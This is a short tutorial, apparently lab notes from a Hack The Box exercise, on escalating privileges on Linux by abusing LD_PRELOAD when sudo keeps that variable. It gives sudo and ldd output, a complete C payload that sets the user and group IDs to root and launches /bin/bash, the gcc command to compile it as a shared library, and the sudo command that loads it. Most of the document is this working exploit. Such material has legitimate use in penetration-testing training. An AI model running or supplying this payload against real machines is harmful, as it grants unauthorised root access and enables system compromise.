# How to exploit with LDPRELOAD

## What is?
It's same as .dll for Windows, Linux have .so or Dynamic libraries that are loaded into a program at startup.

## How to check for dynamic libraries?
`ldd PROGRAMM`

## How to exploit
1)You must be able to run a program as sudo:
```
htb-student@NIX02:~$ sudo -l 
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```
2)Check what libraries are loaded
```
ldd /usr/bin/openssl
       linux-vdso.so.1 =>  (0x00007ffd575d1000)
        libssl.so.1.0.0 => /lib/x86_64-linux-gnu/libssl.so.1.0.0 (0x00007f90655f3000)
        libcrypto.so.1.0.0 => /lib/x86_64-linux-gnu/libcrypto.so.1.0.0 (0x00007f90651af000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9064de5000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f9064be1000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f906585c000)
```
3)Prepare the payload
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
4)Compile it:
`gcc -fPIC -shared -o pe.so pe.c -nostartfiles`
5)Invoke the payload
`sudo LD_PRELOAD=./pe.so <COMMAND>` 
(Use any command you can run with sudo)
